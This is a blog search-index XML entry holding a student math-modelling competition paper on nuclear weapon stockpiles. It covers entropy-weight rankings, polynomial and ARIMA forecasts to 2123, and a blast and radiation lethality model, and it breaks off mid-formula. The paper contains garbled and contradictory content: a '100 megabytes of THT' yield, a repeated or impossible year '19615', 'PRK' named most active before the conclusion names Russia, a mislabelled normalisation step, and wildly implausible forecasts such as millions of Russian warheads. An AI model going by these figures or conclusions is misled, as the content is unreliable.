<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>2022年美赛数学建模</title>
      <link href="/2024/03/31/2022%E5%B9%B4%E7%BE%8E%E8%B5%9B%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1/"/>
      <url>/2024/03/31/2022%E5%B9%B4%E7%BE%8E%E8%B5%9B%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1/</url>
      
        <content type="html"><![CDATA[<h1 id="2022-APMCM-summary-sheet"><a href="#2022-APMCM-summary-sheet" class="headerlink" title="2022 APMCM summary sheet"></a>2022 APMCM summary sheet</h1><p>​        Because of the terrible power of nuclear weapons, many countries hope to use it to deter other countries and protect themselves from foreign invasion. Based on nuclear weapons  development data of various countries over the years, this paper analyzes and predicts the  change trend of nuclear weapons in the future, and establishes the lethality model to calculate  the destructive capability of nuclear weapons. The following analysis is carried out for each  problem. </p><p>​        For the first problem, firstly, the data is preprocessed, and the obtained data is drawn into  line charts and bar charts for descriptive analysis and visual analysis. Then, the entropy weight  method is used to calculate the weights of the variables of status, tests and stockpile, which are  0.0422,0.9198 and 0.0380, respectively. The country that is most active in nuclear weapons  research is calculated according to the weights obtained. </p><p>​        For the second problem, first of all, the number of nuclear weapons in the whole country  is obtained through data processing. Then, the relationship between the storage number and the year is found by fitting. After repeated adjustment, the coefficient of determination of each  fitting result is no less than 0.8, and the relationship between the year and the number of  nuclear weapons of each country and the whole world is obtained. The fitting model is  established to predict the number of nuclear weapons. In order to increase the accuracy of the  prediction results, the ARIMA(p, d, q) prediction model is established to predict the number of  nuclear weapons in the future and the countries that may possess nuclear weapons in the  future. Due to the international situation, it is understood that South Africa has voluntarily given up the development of nuclear weapons, so the forecast data does not include South  Africa. </p><p>​        For the third problem, the lethal model of the detonation location of nuclear weapons is  first established, which is described from two aspects: the killing power of blast wave and the  degree of nuclear radiation damage. The effective killing distance and area are calculated  according to the nuclear bomb killing formula, and the blast shock wave overpressure peak  value is calculated by using the empirical formula of spherical charge explosion in infinite air  medium. The killing radius corresponding to different impact damage levels is obtained and  the explosion wave power model is established. The degree of nuclear radiation damage mainly depends on the sum of neutron and γ radiation dose absorbed by human body. Then,  the model is used to calculate the damage range of “Big Ivan” nuclear bomb with 100  megabytes of THT equivalent and the number of destroyed earth. It can be seen that the  number of existing nuclear bombs cannot destroy the earth. Finally, taking 10% of land damage as the limit of total nuclear warheads, the number of nuclear warheads destroyed by a  large country is taken as the maximum number of nuclear warheads possessed by a nuclear  country. </p><p><strong>Key words</strong>: entropy weight method, fitting, time series model</p><h1><center>Contents </center></h1>[TOC]<h2 id="1-Problem-background-and-restatement"><a href="#1-Problem-background-and-restatement" class="headerlink" title="1 Problem background and restatement"></a>1 Problem background and restatement</h2><h3 id="1-1-Problem-background"><a href="#1-1-Problem-background" class="headerlink" title="1.1 Problem background"></a>1.1 Problem background</h3><p>​        Nuclear weapon refers to the huge deadly weapons related to nuclear reaction, including  hydrogen bomb, atomic bomb, neutron bomb, etc. It is one of the most powerful weapons  developed by human beings and has a terrible power. Therefore, many countries hope to use it  to deter other countries and protect their own countries from foreign invasion. After World  War II, all countries in the world began to frantically develop and manufacture atomic bombs,  “Big Ivan” is now the world’s known most powerful nuclear bomb. Many people believe that  nuclear weapons can destroy the Earth many times over by affecting the living conditions of  human beings on Earth. </p><h3 id="1-2-Problem-restatement"><a href="#1-2-Problem-restatement" class="headerlink" title="1.2 Problem restatement"></a>1.2 Problem restatement</h3><p>​        Based on the above background, and on the basis of collecting data on nuclear weapons  development, research and development attitudes and policies of various countries over the  past years, the following questions are answered. </p><ol><li>A mathematical model is established and the relevant data are used for quantitative  analysis to identify the countries that possess nuclear weapons, the countries that have reduced  or increased their stockpiles the most in the past 20 years, the five years in which nuclear  weapons tests have occurred the most, the countries that have been the most active in nuclear  weapons research in the past decade, and the countries that have made the fastest transition  from “no consideration of nuclear weapons” to “possession of nuclear weapons”. </li><li> To build a mathematical model to predict the number of nuclear weapons, predict the  next 100 years of nuclear weapon states and the number of nuclear weapons, the total number  of nuclear weapons in 2123, the number of nuclear weapons in each country to change trends. </li><li>To build a mathematical model of the detonation location of nuclear weapons and  calculate the maximum destructive power of nuclear weapons. Estimate the minimum number  of nuclear bombsthat could destroy the planet, and determine whether the current total number  of nuclear bombs could destroy the planet. To protect the planet and the environment on which  we live, set limits on the total number of nuclear bombs in the world and the number of nuclear  bombs by nuclear states. </li></ol><h2 id="2-Problem-analysis"><a href="#2-Problem-analysis" class="headerlink" title="2 Problem analysis"></a>2 Problem analysis</h2><h3 id="2-1-Problem-one-analysis"><a href="#2-1-Problem-one-analysis" class="headerlink" title="2.1 Problem one analysis"></a>2.1 Problem one analysis</h3><p>​        According to the four tables of data on nuclear weapons of each country given in the  annex of the title, the change of each country’s position on nuclear weapons is analyzed. By  studying the stockpiles of nuclear warheads of each country in the past 78 years and comparing  the changes of nuclear warhead stockpiles of 10countries, the bar chart of the world’s annual  nuclear weapons tests in the past 78 years is drawn. And draw a broken line chart showing the  changing positions of countries that once possessed nuclear weapons on nuclear weapons.The  attachment data is preprocessed, the data in the form is analyzed by entropy weight method,and the status of each country, the number of tests, and the weight of stockpile changes are  calculated. </p><h3 id="2-2-Problem-two-analysis"><a href="#2-2-Problem-two-analysis" class="headerlink" title="2.2 Problem two analysis"></a>2.2 Problem two analysis</h3><p>​        The nuclear weapon reserves of the countries in the annex have been indicated in each  year, so it is necessary to predict the number of nuclear weapons in the future. The  establishment of a prediction model to calculate the number of nuclear weapons in a future  year according to the existing historical data belongsto the prediction problem. Due to the large  number of countries, it is particularly important to extract the relationship between the number  of nuclear weapons in each country and the year. Since the storage capacity changes with time,  the time series model is chosen here to predict the future storage capacity. </p><h3 id="2-3-Problem-three-analysis"><a href="#2-3-Problem-three-analysis" class="headerlink" title="2.3 Problem three analysis"></a>2.3 Problem three analysis</h3><p>​        In view of problem 3, firstly, the establishment of the lethal model of the detonation  location: firstly, we can directly establish the explosive wave power model from the power of  nuclear explosion itself, considering the effective killing range (area)generated by the shock  wave, the heat energy released and the peak overpressure of the explosion wave; Secondly, the  killing power of nuclear weapons can be described indirectly from the damage degree of  nuclear radiation to human body and environment. In a nuclear explosion, a large number of  neutrons and γ radiation are released, and the damage of nuclear radiation to human body  mainly depends on the sum of the neutrons and γ radiation absorbed. </p><p>​        Then, as for the choice of the TNT equivalent of nuclear bomb, considering the large  energy needed to destroy the earth, we chose “Big Ivan”, the largest TNT equivalent of  100M.Finally, in terms of the limitation of nuclear warheads, according to the data, it is  impossible to achieve zero nuclear warheads, so we can only choose to reduce the damage of  nuclear explosions to the earth and reduce the total number of nuclear warheads, and we  choose 10% of the land destruction area. For nuclear states, the role of nuclear bombs in  safeguarding national security should be considered. Therefore, the number of nuclear warheads destroyed by a large country is taken as the maximum number of nuclear warheads  possessed by a nuclear state. </p><h3 id="3-Problem-hypothesis"><a href="#3-Problem-hypothesis" class="headerlink" title="3 Problem hypothesis"></a>3 Problem hypothesis</h3><ol><li>Assume that all nuclear bombs in the world have a TNT equivalent of 100Mt. </li><li>Assume that the detonation of a nuclear bomb is instantaneous, disregarding the nuclear reaction process of the explosion. </li><li>Assume that the energy from a nuclear bomb explosion is all expressed in the form of  a shock wave and travels in a straight line. </li><li>Assume that the kill power of multiple nuclear bombs is equal to the sum of TNT  equivalent. </li><li>Assume that the nuclear explosion is a ground nuclear explosion, and the damage to the ground explosion is close to a circle. </li><li>Assume that the air density is standard air density 1.29kg/m. </li></ol><h2 id="4-Symbol-description"><a href="#4-Symbol-description" class="headerlink" title="4 Symbol description"></a>4 Symbol description</h2><p>​        In order to facilitate reading and understanding, the paper gives a unified explanation of  important variables, as shown in Tab. 4-1. </p><center>Tab.4-1 Symbol description </center>| Symbol | Description                  | Symbol | Description                     || ------ | ---------------------------- | ------ | ------------------------------- || SST    | Sum of the total squares     | p      | Regression term coefficients    || SSE    | Regression to sum of squares | q      | Sliding average number of items || SSR    | Sum of squared errors        | d      | Number of differences           |<h2 id="5-Model-and-solution-of-problem-one"><a href="#5-Model-and-solution-of-problem-one" class="headerlink" title="5 Model and solution of problem one"></a>5 Model and solution of problem one</h2><h3 id="5-1-a-preprocessing"><a href="#5-1-a-preprocessing" class="headerlink" title="5.1 a preprocessing"></a>5.1 a preprocessing</h3><p>​        For problem 1, first of all, check the data in the attachment, and use matlab programming  to check the following data anomalies: </p><ol><li>Whether there is a missing value; </li><li>Import the data into matlab to check for the presence of NaNso, to determine whether there are outliers. </li><li>Use the unique function to check and weed out a large number of duplicate values. After  calculation, there are no missing values, outliers, duplicate values in the attachment. </li></ol><h3 id="5-2-Descriptive-statistical-analysis"><a href="#5-2-Descriptive-statistical-analysis" class="headerlink" title="5.2 Descriptive statistical analysis"></a>5.2 Descriptive statistical analysis</h3><p>​        Question a requires to analyze the position form in the attachment of the topic, and summarize the data according to Status, 0 is none, l is Consideration, 2 is Pursuit, 3 is  Possession, and the conclusion can be reached: Russia, the United States, China, France, the  United Kingdom, Pakistan, India, Israel, North Korea and South Africa once possessed nuclear weapons. </p><p>​        According to question b, analyze the form in the attachment to obtain Tab.5-1.Nuclear  weapons change line Fig.5-1 is obtained by using matlab to draw according to data in form  Stockpiles. According to Tab.5-1 and Fig.5-1, it can be concluded that in the past 20 years,  nuclear weapons stockpile of United States has changed the most. The stockpile has decreased  by 6749. </p><center>Tab.5-1 Table of relative and absolute changesin estimated nuclear warhead stockpiles over the  past 20 years </center>| Country        | 2002      | 2022     | Absolute Change | Relative Change || -------------- | --------- | -------- | --------------- | --------------- || United States  | 10,457.00 | 3,708.00 | -6,749.00       | -65%            || Russia         | 10,114.00 | 4,477.00 | -5,637.00       | -56%            || United Kingdom | 280.00    | 180.00   | -100.00         | -36%            || France         | 350.00    | 290.00   | -60.00          | -17%            || South Africa   | 0.00      | 0.00     | +0.00           |                 || Israel         | 76.00     | 90.00    | 14.00           | +18%            || North Korea    | 0.00      | 20.00    | +20.00          |                 || China          | 235.00    | 350.00   | +115.00         | +49%            || India          | 23.00     | 160.00   | +137.00         | +596%           || Pakistan       | 26.00     | 165.00   | +139.00         | +535%           |<img src="D:\blog\shierjinghuang\source\_posts\2022年美赛数学建模\Nuclear weapons change line graph.png" style="zoom:50%;" /><center>Fig.5-1 Nuclear weapons change line graph </center>​        To solve question c, to analyze the data of the form Tests attached to the question and get  the number of nuclear weapons experiments conducted in the world every year. In order to get  the conclusion intuitively, the bar graph is drawn and the graph of the number of nuclear  weapons experiments from 1945 to 2019 is obtained. It can be concluded that in 1962, 1958,  1968, 1966, 1966 and 19615, nuclear weapon tests occurred the most, 178 times, 116 times, 79  times, 76 times and 71 times respectively. <img src="D:\blog\shierjinghuang\source\_posts\2022年美赛数学建模\The graph of the number of nuclear weapon tests from 1945 to 2019.png" style="zoom:50%;" /><center>Fig.5-2 The graph of the number of nuclear weapon tests from 1945 to 2019 </center>​        According to question a, 10 countries that once possessed nuclear weapons have been  known. In order to facilitate the analysis of question e, 10 countries that once possessed  nuclear weapons given in the form Position in the attachment are analyzed and a broken line  chart is drawn, obtaining the positions of China and Israel on nuclear weapons in Fig5-3, India  and Pakistan on nuclear weapons in Fig5-4 and South Africa and North Korea on nuclear  weapons in Fig5-5. In the positions of countries on nuclear weapons in Fig5-3, Fig5-4 and  Fig5-5, 0 represents no consideration, 1 represents Consideration, 2 represents Pursuit and 3 represents Possession, and the transition year table from "no consideration of nuclear weapons"  to "possession of nuclear weapons" for each country in Tab.5-2 is obtained, and the United States can be seen the transition from "no consideration of nuclear weapons" to "possession of  nuclear weapons" is the fastest. <center>Tab.5-2 A table of countries' transition yearsfrom "no consideration of nuclear weapons "to "possession of nuclear weapons. </center>| country        | Does not consider | Possesses | Year difference || -------------- | ----------------- | --------- | --------------- || India          | 1947              | 1987      | 40              || Pakistan       | 1971              | 1987      | 16              || China          | 1951              | 1964      | 9               || Israel         | 1948              | 1967      | 19              || France         | 1944              | 1960      | 16              || United Kingdom | 1939              | 1952      | 13              || Russia         | 1941              | 1949      | 8               || United States  | 1938              | 1945      | 7               || South Africa   | 1968              | 1979      | 11              || North Korea    | 1961              | 2006      | 45              |<img src="D:\blog\shierjinghuang\source\_posts\2022年美赛数学建模\Chart of positions of China and Israel on nuclear weapons.png" style="zoom: 67%;" /><center>Fig.5-3 Chart of positions of China and Israel on nuclear weapons </center><img src="D:\blog\shierjinghuang\source\_posts\2022年美赛数学建模\India and Pakistan's position on nuclear weapons.png" style="zoom: 67%;" /><center> Fig.5-4 India and Pakistan's position on nuclear weapons</center><img src="D:\blog\shierjinghuang\source\_posts\2022年美赛数学建模\Position graph of nuclear weapons in South Africa and North Korea.png" style="zoom:67%;" /><center>Fig.5-5 Position graph of nuclear weapons in South Africa and North Korea </center>### 5.3 entropy weight method analyzes the research activity of nuclear weapons<p>To solve question d, we use the entropy weight method to analyze the weight of  variations, using status in the form Tests and stockpile in the form Position the. The principle is as follows: </p><ol><li>Standardize the data, so that the data is distributed between 0 and l. There is a formula  below. </li></ol><p>$$<br>\overline{a_{ij}} = \frac{a_{ij} - \mu_j}{s_j}<br>$$</p><p>​    where,<br>$$<br>𝜇_𝑗 = \frac{1}{n}\sum \limits <em>{i = 1}^n 𝑎</em>{𝑖𝑗}<br>$$</p><p>$$<br>𝑠_𝑗 = \sqrt {\frac{1}{n-1} \sum \limits <em>{i = 1}^n {(a</em>{𝑖𝑗}− 𝜇_𝑗)^2}}<br>$$</p><ol start="2"><li><p>Calculate the information entropy of each index according to the definition of information entropy in information theory, the information entropy of a group of data is below.<br>$$<br>𝐸<em>j= − ln(𝑛) ^{-1}\sum \limits <em>{i = 1}^n 𝑝</em>{𝑖𝑗}ln 𝑝</em>{𝑖𝑗}<br>$$<br>where,<br>$$<br>𝑝_{𝑖𝑗}= \frac{𝑌_{𝑖𝑗}}{\sum \limits _{i = 1}^n 𝑌_𝑦 }<br>$$</p></li><li><p>Finally determine the weight of each index. </p><p>The entropy weight method obtains its Status, the number of Tests, and the Stockpile variation with the weight of 0.0422,0.9198, 0.0380. Calculate it by weight PRK is the most active, and conclude that in the past decade, Russia has been the most active in nuclear weapons research. </p></li></ol><h2 id="6-Model-and-solution-of-problem-two"><a href="#6-Model-and-solution-of-problem-two" class="headerlink" title="6 Model and solution of problem two"></a>6 Model and solution of problem two</h2><h3 id="6-1-Data-preprocessing"><a href="#6-1-Data-preprocessing" class="headerlink" title="6.1 Data preprocessing"></a>6.1 Data preprocessing</h3><p>​        For problem 2, we first conduct pre-processing and check for attachment data Stockpile: whether there are missing values, duplicate values, outlier values, etc. In order to reduce the error, we set the data years from 1945 to 2022 as 1 to 78.And calculate the comparison table of the world’s years and nuclear weapons reserves, as shown in Tab.6-1. </p><center>Tab.6-1Comparison table of years and nuclear weaponsreserves in the world </center>| Year | Stockpile || ---- | --------- || 1    | 2         || 2    | 9         || 3    | 13        || 4    | 50        || …    | …         || 75   | 9325      || 76   | 9330      || 77   | 9458      || 78   | 9440      |<p>​        No missing data or abnormal data has been found after examination for Stockpile. The data Stockpile of each country is relatively complete with a wide range of years and high reliability of data. </p><h3 id="6-2-Problem-2-Model-establishment"><a href="#6-2-Problem-2-Model-establishment" class="headerlink" title="6.2 Problem 2 Model establishment"></a>6.2 Problem 2 Model establishment</h3><p>​        The data is the reserves of nuclear weapons, and the data dimension is relatively low. The year and reserves comparison table of each country can be fitted with the data.The principle of  linear fitting is as follows. </p><ol><li><p>The least square method is used to find the fitting equation of the number of annual nuclear weapons in each country and the world.<br>$$<br>𝑦 = 𝑘̂𝑥 + 𝑏̂<br>$$</p><p>$$<br>𝑘̂ = \frac{ n\sum \limits _{i = 1}^n 𝑥_𝑖 𝑦_𝑖 -\sum \limits _{i = 1}^n 𝑦_𝑖 \sum \limits _{i = 1}^n 𝑥_𝑖 }<br>{ n \sum \limits _{i = 1}^n 𝑥_𝑖^2 − \sum \limits _{i = 1}^n 𝑥_𝑖 \sum \limits _{i = 1}^n 𝑥_𝑖 }<br>$$</p><p>$$<br>𝑏̂ = \frac{ \sum \limits _{i = 1}^n 𝑦_𝑖\sum \limits _{i = 1}^n x_i^2 -\sum \limits _{i = 1}^n x_i𝑦_𝑖 \sum \limits _{i = 1}^n 𝑥_𝑖 }<br>{ n \sum \limits _{i = 1}^n 𝑥_𝑖^2 − \sum \limits _{i = 1}^n 𝑥_𝑖 \sum \limits _{i = 1}^n 𝑥_𝑖 }<br>$$</p></li></ol><p>After the fitting equation is obtained, the goodness of fit of the equation is obtained by using the formula to judge  the fitting effect. When the goodness of fit is close to 1, the fitting effect is better.<br>$$<br>𝑆𝑆𝐸 = \sum \limits _{i = 1}^n {(y_i− 𝑦̂)^2}<br>$$</p><p>$$<br>𝑆𝑆𝑇 = \sum \limits _{i = 1}^n (𝑦_𝑖 − 𝑦̅) ^2<br>$$</p><p>$$<br>𝑆𝑆𝑅 = \sum \limits _{i = 1}^n(𝑦̂_i − 𝑦̅ ) ^2<br>$$</p><p>$$<br>0 ≤ 𝑅^2 = \frac {𝑆𝑆𝑅} {𝑆𝑆𝑇} = \frac{𝑆𝑆𝑇 − 𝑆𝑆𝐸} { 𝑆𝑆𝑇} = 1 − \frac {𝑆𝑆𝐸} {𝑆𝑆𝑇} ≤ 1<br>$$</p><p>For question a, we establish a time series model and solve the model. </p><p><strong>Step 1: Data stationarity test</strong> </p><p>​        Firstly, using Matlab to test the data stationarity. If the data of different countries are found  to be less stable after being brought in, the difference of the original data is taken, and then the  test is carried out until it passes the test. Because there are many countries, we takes China as an  example here, as shown in Fig.6-1.</p><img src="D:\blog\shierjinghuang\source\_posts\2022年美赛数学建模\Variance analysis diagram of China.png" style="zoom:50%;" /><center>Fig. 6-1 Variance analysis diagram of China </center>**Step 2: Determine the model parameters** <p>​        The model parameters p, q and d were determined by autocorrelation function(ACF) and  partial autocorrelation function(PACF) based on the stabilized data. Where d isthe difference  order, p, q are determined by the order of the following equation using AIC and BIC criteria  through matlab.<br>$$<br>X_𝒕 = 𝒄 + a_𝟏 X_{𝒕−𝟏} + 𝜶<em>𝟐 X</em>{𝒕−𝟐} + ⋯ + 𝜶<em>𝒑 X</em>{𝒕−𝒑} + 𝜺<em>𝒕 + 𝜷_𝟏 𝜺</em>{𝒕−𝟏} + ⋯ + 𝜷<em>𝒒 𝜺</em>{𝒕−𝒒}<br>$$<br>The autocorrelation and partial autocorrelation graphs drawn by matlab are shown in Fig.6-2. </p><img src="D:\blog\shierjinghuang\source\_posts\2022年美赛数学建模\Autocorrelation and partial autocorrelation pictures of China.png" style="zoom:67%;" /><center>Fig.6-2 Autocorrelation and partial autocorrelation pictures of China </center>**Step 3: Model construction** <p>​        Matlab and its own prediction tool are used to construct and predict the model and Fig. 6-3  is obtained:</p><img src="D:\blog\shierjinghuang\source\_posts\2022年美赛数学建模\China's time series model prediction chart.png" style="zoom: 60%;" /><center>Fig. 6-3 China's time series model prediction chart </center>### 6.3 Solution of Problem 2 model<p>​        Step 1: For question b, the relationship between the number and year of nuclear weapons in  the country and the world can be obtained by using fitting calculation, as shown in Fig.6-4 to  Fig.6-10. </p><img src="D:\blog\shierjinghuang\source\_posts\2022年美赛数学建模\Number and Year fitting graph of nuclear weapons of China and France.png" style="zoom: 60%;" /><center>Fig. 6-4 Number and Year fitting graph of nuclear weapons of China and France </center><img src="D:\blog\shierjinghuang\source\_posts\2022年美赛数学建模\Number and Year fitting graph of nuclear weapons of India and Israel.png" style="zoom:60%;" /><center>Fig.6-5 Number and Year fitting graph of nuclear weapons of India and Israel</center><img src="D:\blog\shierjinghuang\source\_posts\2022年美赛数学建模\Number and Year fitting graph of nuclear weapons of North Korea and Pakistan.png" style="zoom:60%;" /><center>Fig.6-6 Number and Year fitting graph of nuclear weapons of North Korea and Pakistan</center><img src="D:\blog\shierjinghuang\source\_posts\2022年美赛数学建模\Number and Year fitting graph of nuclear weapons of Russia and the United Kingdom.png" style="zoom:60%;" /><center>Fig.6-7 Number and Year fitting graph of nuclear weapons of Russia and the United Kingdom</center><img src="D:\blog\shierjinghuang\source\_posts\2022年美赛数学建模\Number and Year fitting graph of nuclear weapons of the United States and the World.png" style="zoom:60%;" /><center>Fig.6-8 Number and Year fitting graph of nuclear weapons of the United States and the World </center>**The corresponding formula for China is:** $$y = 1.758589586213E − 04𝑥^4 − 2.865922062910𝐸 − 02𝑥^3 + 1.480494595983𝐸 + 00𝑥^2 − 2.075941202614𝐸 + 01𝑥 + 5.980836621847𝐸 + 01$$**The corresponding formula for France is:** $$y = 1.090228106461E − 05𝑥^5 − 1.952155699827𝐸 − 03𝑥^4 + 1.128467098749𝐸 − 01𝑥^3 − 2.222112809877𝐸 + 00𝑥^2 + 1.446885471555𝐸 + 01𝑥 − 2.055355206383𝐸 + 01 $$**The corresponding formula for India is:** $$y = 7.054782608696E + 00x − 3.868930434783E + 02 $$**The corresponding formula for Israel is:** $$y = 1.448564094134E + 00x − 1.776956376956E + 01 $$**The corresponding formula for North Korea is:** $$y = 6.673948873745E − 10𝑥^6 + 1.402428079896𝐸 − 07𝑥^5 − 3.304782580804𝐸 − 05𝑥^4 + 2.028431954671𝐸03𝑥^3 − 4.903423282672𝐸 − 02𝑥^2 + 4.403173966551𝐸 − 01 − 9.591027132012𝐸 − 01 $$**The formula for Pakistan is:** $$y = 7.356153846154E + 00x − 3.989461538462E + 02$$**The corresponding formula for Russia is:** $$y = −2.066025970539E − 04𝑥^5 + 8.395634338470𝐸 − 02𝑥^4 − 9.974565977602𝐸 + 00𝑥^3 + 4.501570472946𝐸 + 02𝑥^2 − 6.887059684175𝐸 + 03𝑥 + 3.024866446426𝐸 + 04 $$**The corresponding formula for United Kingdom is:** $$y = 1.062000638735E − 02𝑥^3 − 1.640238161541𝐸 + 00𝑥^2 + 7.461626511325𝐸 + 01𝑥 − 6.374009978584𝐸 + 02 $$**The corresponding formula for United States is:** $$y = 4.970163822984E − 01𝑥^3 − 7.685975917203𝐸 + 01𝑥^2 + 3.205357479012𝐸 + 03𝑥 − 1.444184629055𝐸 + 04 $$<p><strong>The formula for World is:</strong><br>$$<br>y = −3E − 05𝑥^6 + 0.3048𝑥^5 − 1508.4𝑥^4 + 4𝐸 + 06𝑥^3 − 6𝐸 + 09𝑥^2 + 5𝐸 + 12𝑥 − 2𝐸 + 15<br>$$<br>​        By substituting the number corresponding to the year 2123 into each formula, we can get  the number of nuclear weapons in China, France, India, Israel, North Korea, Pakistan, Russia,  United Kingdom and United States: 58183, 577920, 876, 242, 23938, 918, 4.23864e+006, 21074, 947211. </p><p>​        Through linear fitting, the number of nuclear weapons of each country and the world in  the next 100 years can be preliminarily predicted. In order to further reduce the error and  improve the accuracy, the time series model is used to solve the model. </p><p>​        For question a, ARIMA(p, d, q) model is selected. p, d and q parameters are determined,  and d-order backward difference is calculated. </p><p>$$<br>∇<em>𝑑 𝑌_𝑡=∇</em>{𝑑−1} 𝑌<em>𝑡 − ∇_𝑑 𝑌</em>{𝑡−1} = (1 − 𝐵) ∇_{𝑑−1} 𝑌_𝑡 = ⋯ = (1 − 𝐵)^𝑑𝑌_𝑡<br>$$<br>The arima formula calculated. </p><p>$$<br>((1 − \sum \limits _{i = 1}^p ∅_𝑖 𝐵^𝑖)(1 − 𝐵)^𝑑 𝑌_𝑖 = (1 + \sum \limits _{i = 1}^q 𝜃_𝑖 𝐵^𝑖) 𝜀_𝑖 ↔ (1 − 𝐵)^𝑑 𝑌_𝑖 − \sum \limits _{i = 1}^p ∅𝑖(1 − 𝐵)^𝑑 Y^{𝑡−𝑖} = \sum \limits <em>{i = 1}^q 𝜃_𝑖 𝜀</em>{𝑖−1} +𝜀_𝑖)<br>$$<br>​        Build the model, use the time prediction model tool in spsspro to get the prediction  results, and make the test set more than 90% correct. Finally, the following results are obtained  by importing the data. </p><center>Tab.6-2 Predicted values and goodness of fit of reserves of countries and the world </center>| Country   | China  | France | India  | Israel | Russia || --------- | ------ | ------ | ------ | ------ | ------ || Stockpile | 999.84 | 600.9  | 1277.6 | 218.8  | 2535.5 || R²        | 0.982  | 0.98   | 0.996  | 0.998  | 0.998  |<table><thead><tr><th>Country</th><th>North Korea</th><th>United Kingdom</th><th>United States</th><th>World</th></tr></thead><tbody><tr><td>Stockpile</td><td>45.9</td><td>1128</td><td>1691</td><td>59788</td></tr><tr><td>R²</td><td>0.857</td><td>0.958</td><td>0.992</td><td>0.979</td></tr></tbody></table><p>​        Step 2: Analyze and process the attached data position, and use the time series prediction  model to solve the nuclear weapon states in 100 years. Due to the large amount of data, the  data of ten countries that already know the situation of nuclear weapons are first removed, and  then the status of all countries from 1938 to 2022 are removed, and the 19 countries that are  most likely to possess nuclear weapons in the next 100 years are obtained. Then, the time series model is used to predict the status development of each country in 100 years, and the Tab.6-3  is shown as follows: </p><center>Tab.6-3 Predicted status values and goodness of fit for each country after 100 years </center>| Country     | Forest               | R²    || ----------- | -------------------- | ----- || Algeria     | 0.0898981745892814   | 0.766 || Argentina   | 0.12342365117639151  | 0.826 || Australia   | 0.34926806354026124  | 0.859 || Egypt       | 0                    | 0.889 || Germany     | 0.09465938322576074  | 0.609 || Indonesia   | 0.045994603387985986 | 0.643 || Iran        | 4.3809523809523725   | 0.945 || Iraq        | 0.2600939120120171   | 0.856 || Syria       | 2.172                | 0.913 || Switzerland | 0                    | 0.886 || Sweden      | 0                    | 0.888 || South Korea | 0.25                 | 0.866 || Serbia      | 0.440760108943       | 0.783 || Romania     | 0. 117644254         | 0.814 || Norway      | 0                    | 0.845 || Libya       | 0                    | 0.90  || Japan       | 0.119                | 0.624 || Italy       | 0.04547              | 0.713 |<p>​        We can see that Iran is most likely to have nuclear weapons 100 years from now, so the  countries that have nuclear weapons 100 years from now are Iran, Russia, the United States,  China, France, the United Kingdom, Pakistan, India, Israel, North Korea. </p><h2 id="7-Model-and-solution-of-problem-three"><a href="#7-Model-and-solution-of-problem-three" class="headerlink" title="7 Model and solution of problem three"></a>7 Model and solution of problem three</h2><h3 id="7-1-Solution-and-analysis-of-Question"><a href="#7-1-Solution-and-analysis-of-Question" class="headerlink" title="7.1 Solution and analysis of Question"></a>7.1 Solution and analysis of Question</h3><h4 id="7-1-1-of-nuclear-weapon-Lethality"><a href="#7-1-1-of-nuclear-weapon-Lethality" class="headerlink" title="7.1.1 of nuclear weapon Lethality"></a>7.1.1 of nuclear weapon Lethality</h4><p>​        By establishing the lethality model of the detonating position of nuclear weapons, we can describe it by the killing power of its explosion shock wave and the damage degree of nuclear radiation to human body and environment. The blast wave is a factor to be considered when the missile and the target are detonated in close contact. A model of blast wave power is established to describe the killing power of blast wave. According to the nuclear bomb lethal formula, we can effectively describe the effective killing distance R and area S of nuclear  bomb explosion. </p><p>$$<br>R = C × Q^{\frac {1} {3}}<br>$$</p><p>$$<br>𝑆 = 𝜋 × 𝑅^2<br>$$</p><p>​        Where, C is the constant of proportionality, taking the value of 1.493885, and Q is THT  equivalent.</p><p>​        The calculation of the peak overpressure of the explosion shock wave can be done by using the empirical formula of spherical charge explosion in infinite air medium. </p><p>$$<br>𝛥𝑃_{𝑚𝑎𝑥} = \frac {0.082} {𝑍} + \frac {0.26} {𝑍^2} + \frac {0.69 } {𝑍^3 }<br>$$</p><p>$$<br>𝑍 = 𝑅 𝑄 ^{\frac {1} {3}}<br>$$</p><p>​        Where, ΔP is the explosion shock wave overpressure peak (MPa),Z is the contrast distance (m/kg ),R is the radius of spherical expansion, and Q is the equivalent of TNT. </p><p>​        According to Tab.7-1, the damage grade caused by shock wave can be judged, and the killing radius corresponding to different impact injury grades can be calculated. Mild impact damage radius range [399.04,522.35)𝑄(m), moderate impact damage radius range [264.04,399.04)𝑄(m), severe impact damage radius range [201.91,264.04)𝑄(m), and extremely severe impact damage radius range(0,201.91)𝑄(m).[2] </p><center>Tab.7-1 Impact injury levels </center>| extent                   | Mild  | Moderate | Severe | Very severe || ------------------------ | ----- | -------- | ------ | ----------- || Overpressure range / kPa | 20~30 | 30~60    | 60~100 | \>100       |<p>​        During a nuclear explosion, a large number of neutrons and γ radiation are released .And the extent to which nuclear radiation harms the human body depends mainly on the sum of the neutrons and γ radiation doses absorbed by the human body[1].The formula for  calculatingneutron dose in nuclear radiation is </p><p>$$<br>𝐷_{𝑜𝑛} = 4.9 × 10^7 𝑄 \frac {𝑒^{\frac {−𝑟𝜌} {230}}} {𝑟^2}<br>$$</p><p>$$<br>𝜌 = 1.226 × {[1 − 2.22 × 10^−5 (𝑍 +\frac{𝐻} {𝑍} )]}^{4256}<br>$$</p><p>​        Where, D<del>𝑜𝑛</del>is the neutron dose (Gy), Q is the TNTequivalent (kt),r is the distance from the ground point to the detonation center (m), and ρ is the air density at the half of detonation  height (mg/cm3 ),Z is the elevation of the projection point of the detonation center (m), and H is the explosion height (m). </p><p>​        When is the far zone (rρ &gt; 2000m ∙ mg/cm^3^), the formula for calculating γ radiation dose  of nuclear radiation is<br>$$<br>𝐷_{𝑜𝑟} = 9.1 × 10 ^{−3} 𝐾(𝑄) \frac {𝑒 \frac{−𝑟𝜌} {415}} {𝑟^2}<br>$$<br>​        When it is near region (rρ&lt;2000m ∙ mg/cm^3^ ), the formula for calculating γ radiation dose  of nuclear radiation is </p><p>$$<br>𝐷_{𝑜𝑟} = 2.24 × 10 ^{−2} 𝐾(𝑄) \frac {𝑒 \frac{−𝑟𝜌} {340}} {𝑟^2}<br>$$<br>​        Where,r is the distance from the ground point to the detonation center(m), and ρ is the air density at the half of detonation height (mg/cm3 ),the calculation is the same as formula 7-4, Q  is the nuclear detonation equivalent(kt),coefficient K(Q) = 2.82 × 10^8^× (2 + Q)^1.3^. </p><p>​        Therefore, the absorbed dose of nuclear radiation is 𝐷<del>𝑛𝑟</del>= 𝐷<del>𝑜𝑛</del> 